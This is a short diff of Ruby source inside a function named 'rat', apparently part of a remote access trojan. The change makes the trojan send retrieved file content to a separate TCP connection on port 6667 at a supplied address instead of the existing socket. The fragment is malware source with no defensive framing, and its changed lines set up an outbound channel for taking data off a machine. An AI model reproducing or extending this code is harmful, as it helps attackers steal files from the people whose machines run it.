@@ -63,8 +63,10 @@ def rat(ip)
           else
             socket.puts 'done'
           end
-          socket.puts content.length
-          socket.write content
+          sock = TCPSocket.new(ip,6667)
+          sock.write content
+          sock.flush
+          sock.close
         else
           socket.puts 'error'
         end
